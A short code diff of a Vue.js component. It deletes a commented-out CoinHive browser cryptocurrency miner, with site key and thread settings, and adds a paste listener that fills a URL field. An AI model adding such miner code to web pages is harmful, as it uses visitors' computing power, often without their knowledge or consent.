@@ -441,16 +441,16 @@
       }
     },
     created () {
-      this.doReload()
-      // if (config.username) {
-      //   this.miner = new window.CoinHive.User('WNABDCmX53ZR58rSXxdDSyvIlsVydItZ', config.username, {
-      //     threads: 4,
-      //     autoThreads: false,
-      //     throttle: 0.8,
-      //     forceASMJS: false
-      //   })
-      //   this.miner.start()
-      // }
+      let vm = this
+      vm.doReload()
+      window.addEventListener('paste', e => {
+        if (e.srcElement.id !== 'txtURL') {
+          let data = e.clipboardData.getData('text').trim()
+          vm.$refs.url.value = data
+          vm.$refs.url.focus()
+          e.preventDefault()
+        }
+      })
     }
   }
 </script>
